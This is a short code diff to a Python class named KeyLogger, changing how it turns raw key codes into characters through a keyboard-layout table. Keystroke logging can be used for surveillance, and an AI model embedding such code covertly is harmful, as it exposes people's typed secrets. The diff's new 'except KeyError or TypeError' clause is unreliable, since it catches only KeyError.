@@ -64,10 +64,11 @@ class KeyLogger:
                     # ignore release the key:
                     if self.keyboard_layout[str(key_code)] == [None, None]:
                         continue
+
                     offset: int = int((lambda u: u[0] if lowercase else u[1])(self.keyboard_layout[str(key_code)]))
                     if offset is None:
                         continue
-                except KeyError:
+                except KeyError or TypeError:
                     logging.error(f"Key {key_code} not in the layout")
                     continue
                 char: chr = chr(offset + key_code)
